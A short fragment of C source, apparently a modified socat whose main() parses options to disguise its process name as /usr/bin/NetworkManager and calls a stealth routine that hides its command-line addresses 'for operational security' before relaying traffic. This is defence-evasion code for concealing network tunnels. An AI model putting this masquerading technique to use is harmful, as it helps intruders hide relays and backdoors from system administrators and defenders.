...
int main(int argc, const char *argv[]) {
   ...
   while (arg1[0] && (arg1[0][0] == '-')) {
	 ...
	 if (arg1[0][2] == 's') {
	    ...
	    masq_name = "/usr/bin/NetworkManager";  /* --Mn: NetworkManager */
	 } else if (arg1[0][2] == 'd') {
   ...
   /* Save address strings before stealth hiding for operational security */
   {
      ...
      char *addr2 = strdup(arg1[1]);

      if (!addr1 || !addr2) {
         Error("strdup failed for address arguments");
         Exit(1);
      }

      /* Hide command-line arguments for operational security */
      stealth_hide_arguments(argc0, (char **)argv, masq_name);

      result = socat(addr1, addr2);
